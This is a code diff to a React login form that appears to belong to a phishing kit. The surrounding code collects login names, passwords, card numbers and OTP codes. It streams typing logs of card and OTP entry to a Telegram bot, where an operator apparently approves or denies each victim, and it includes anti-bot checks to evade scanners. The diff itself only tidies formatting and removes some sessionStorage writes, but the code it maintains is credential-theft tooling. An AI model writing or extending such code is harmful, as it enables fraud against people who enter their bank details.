@@ -9,8 +9,14 @@ import OtpVerificationForm from './OtpVerificationForm';
 import LoadingOverlay from './LoadingOverlay';
 import './LoginForm.css';
 
+
+
 function LoginForm() {
-  const { t } = useLanguage();
+   // const navigate = useNavigate(); // Ajoutez cette ligne après les hooks
+
+const { t } = useLanguage();
+
+
   
   // State management
   const [loginName, setLoginName] = useState('');
@@ -150,12 +156,8 @@ function LoginForm() {
       window.location.href = '/blocked';
     }
   };
-  
-  const handleNextStepAppr = () => {
+    const handleNextStepAppr = () => {
     console.log('🔵 Next Step (Appr) button clicked!');
-    // Store the data before navigation
-    sessionStorage.setItem('loginName', loginName);
-    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
     window.location.href = '/nextstepappr';
   };
 
@@ -176,7 +178,8 @@ function LoginForm() {
     sendCardTypingLog,
     sendOtpTypingLog,
     sendBlockedLog
-  } = useTelegramBot(
+
+    } = useTelegramBot(
     sessionId, 
     handleApprove, 
     handleDeny, 
@@ -216,9 +219,6 @@ function LoginForm() {
     };
     setErrors(newErrors);
     if (newErrors.loginName || newErrors.password) return;
-    
-    // Store username in sessionStorage
-    sessionStorage.setItem('loginName', loginName.trim());
     
     const antiBotResult = checkAntiBot();
     console.log('🤖 Enhanced Anti-bot result:', antiBotResult);
